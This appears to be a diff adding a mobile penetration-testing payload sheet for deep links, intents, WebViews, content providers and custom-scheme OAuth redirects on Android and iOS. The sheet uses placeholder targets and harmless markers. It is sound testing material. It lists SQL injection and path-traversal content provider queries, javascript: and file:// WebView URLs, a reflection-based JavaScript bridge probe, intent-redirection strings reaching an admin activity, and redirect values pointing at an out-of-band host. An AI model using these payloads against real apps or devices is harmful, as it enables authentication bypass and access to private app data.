@@ -1,0 +1,123 @@
+# Mobile Deep Link, Intent and WebView Payloads
+# Replace com.example.app, myapp:// and hosts with those of your authorised target and test device.
+
+# Android: enumerate exported components and URL handlers
+aapt dump badging app.apk
+apktool d app.apk
+adb shell dumpsys package com.example.app | grep -iE "scheme|host|path|exported"
+adb shell pm dump com.example.app | grep -A2 -i "intent-filter"
+drozer console connect
+run app.package.attacksurface com.example.app
+run app.activity.info -a com.example.app
+run app.activity.start --component com.example.app com.example.app.AdminActivity
+
+# Android: send a deep link
+adb shell am start -a android.intent.action.VIEW -d "myapp://open?screen=settings"
+adb shell am start -a android.intent.action.VIEW -d "myapp://login?token=test-token-marker"
+adb shell am start -a android.intent.action.VIEW -d "https://app.example.test/deeplink?screen=admin"
+adb shell am start -W -a android.intent.action.VIEW -d "myapp://open?url=https://oast.example.test/deeplink" com.example.app
+
+# Android: start an exported activity directly (authentication bypass check)
+adb shell am start -n com.example.app/.AdminActivity
+adb shell am start -n com.example.app/.SettingsActivity --es "token" "test-token-marker"
+adb shell am start -n com.example.app/.WebViewActivity --es "url" "https://oast.example.test/wv"
+adb shell am start -n com.example.app/.WebViewActivity --es "url" "javascript:document.title='wv-marker'"
+adb shell am start -n com.example.app/.WebViewActivity --es "url" "file:///data/data/com.example.app/shared_prefs/"
+adb shell am start -n com.example.app/.WebViewActivity -d "content://com.example.app.provider/files/test.html"
+adb shell am start -a android.intent.action.SEND --es android.intent.extra.TEXT "intent-marker" -n com.example.app/.ShareActivity
+
+# Android: broadcast receivers and services
+adb shell am broadcast -a com.example.app.ACTION_TEST --es "data" "broadcast-marker"
+adb shell am broadcast -n com.example.app/.TestReceiver --es "cmd" "marker"
+adb shell am startservice -n com.example.app/.TestService --es "action" "marker"
+adb shell am start-foreground-service -n com.example.app/.TestService
+
+# Android: content providers (read-only checks on your own test data)
+adb shell content query --uri content://com.example.app.provider/
+adb shell content query --uri content://com.example.app.provider/users
+adb shell content query --uri "content://com.example.app.provider/users" --where "id=1"
+adb shell content query --uri "content://com.example.app.provider/users" --where "id='1' OR '1'='1'"
+adb shell content read --uri content://com.example.app.provider/files/../../../shared_prefs/prefs.xml
+
+# Android: intent redirection (a component that forwards a nested Intent extra)
+adb shell am start -n com.example.app/.RedirectActivity --es "next" "intent:#Intent;component=com.example.app/.AdminActivity;end"
+intent://open#Intent;scheme=myapp;package=com.example.app;S.url=https://oast.example.test/;end
+intent:#Intent;action=android.intent.action.VIEW;data=https://oast.example.test/;end
+
+# Android: browser-launched intents (browsable activities)
+<a href="intent://open?screen=settings#Intent;scheme=myapp;package=com.example.app;end">open app</a>
+<a href="intent://oast.example.test/#Intent;scheme=https;package=com.example.app;S.browser_fallback_url=https%3A%2F%2Foast.example.test;end">open app</a>
+<a href="myapp://open?url=https://oast.example.test/deeplink">custom scheme link</a>
+
+# Android: JavaScript bridge probes inside an app WebView (run in the page loaded in the app)
+<script>for(var k in window){try{if(window[k]&&typeof window[k]==='object'&&window[k].getClass){document.title='bridge-'+k}}catch(e){}}</script>
+<script>document.title=typeof Android!=='undefined'?'bridge-Android':'no-bridge'</script>
+<script>document.title=typeof JSInterface!=='undefined'?'bridge-JSInterface':'no-bridge'</script>
+<script>try{document.title=Android.getClass().forName('java.lang.System').getMethod('getProperty','x'.getClass()).invoke(null,'os.name')}catch(e){document.title='bridge-denied'}</script>
+
+# Android: WebView file access (file:// handling)
+file:///etc/hosts
+file:///data/data/com.example.app/shared_prefs/prefs.xml
+file:///android_asset/index.html
+file:///sdcard/Download/test.html
+content://com.example.app.provider/files/test.html
+
+# Android: App Links verification
+curl -s https://app.example.test/.well-known/assetlinks.json
+adb shell pm get-app-links com.example.app
+adb shell pm verify-app-links --re-verify com.example.app
+# Look for: missing file, wrong package or fingerprint, wildcard hosts, android:autoVerify missing
+
+# Android: backup and debug flags in the manifest
+android:allowBackup="true"
+android:debuggable="true"
+android:exported="true"
+android:usesCleartextTraffic="true"
+android:networkSecurityConfig
+<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+
+# iOS: URL schemes and Universal Links
+xcrun simctl openurl booted "myapp://open?screen=settings"
+xcrun simctl openurl booted "myapp://login?token=test-token-marker"
+xcrun simctl openurl booted "myapp://open?url=https://oast.example.test/deeplink"
+xcrun simctl openurl booted "https://app.example.test/deeplink?screen=admin"
+curl -s https://app.example.test/.well-known/apple-app-site-association
+curl -s https://app.example.test/apple-app-site-association
+plutil -p Info.plist | grep -A5 CFBundleURLTypes
+plutil -p Info.plist | grep -A3 LSApplicationQueriesSchemes
+# Look for: unverified paths, wildcard components, apps registering the same scheme
+
+# iOS: WebView bridge and message handler probes
+<script>document.title=window.webkit&&window.webkit.messageHandlers?'bridge-'+Object.keys(window.webkit.messageHandlers).join(','):'no-bridge'</script>
+<script>window.webkit.messageHandlers.nativeApp.postMessage({"action":"test","marker":"ios-bridge-marker"})</script>
+
+# OAuth with a custom scheme redirect (a second app can register the same scheme on the device)
+myapp://oauth/callback?code=AUTH_CODE_MARKER&state=STATE
+com.example.app:/oauth2redirect?code=AUTH_CODE_MARKER
+# Prefer claimed HTTPS App Links / Universal Links with PKCE for redirects
+
+# Parameter injection in deep link values
+myapp://open?screen=../admin
+myapp://open?screen=admin
+myapp://open?url=javascript:document.title='deeplink-marker'
+myapp://open?url=//oast.example.test
+myapp://open?url=https://oast.example.test@app.example.test
+myapp://open?redirect=https://oast.example.test
+myapp://webview?url=https://oast.example.test
+myapp://settings?token=
+myapp://reset?token=TEST_TOKEN_MARKER&email=tester@oast.example.test
+myapp://pay?amount=0&to=test-account
+myapp://delete-account?confirm=1
+myapp://open?id=1&id=2
+
+# QR code and push notification payloads (encode these strings into a QR image or notification data on a test device)
+myapp://open?screen=settings
+https://app.example.test/deeplink?screen=admin
+{"aps":{"alert":"push-marker"},"deeplink":"myapp://open?screen=settings"}
+{"to":"<test-device-token>","data":{"url":"myapp://open?url=https://oast.example.test/"}}
+
+# Dynamic analysis helpers (own build)
+frida -U -f com.example.app -l hook.js
+objection -g com.example.app explore
+adb logcat | grep -i com.example.app
+mitmproxy --mode regular
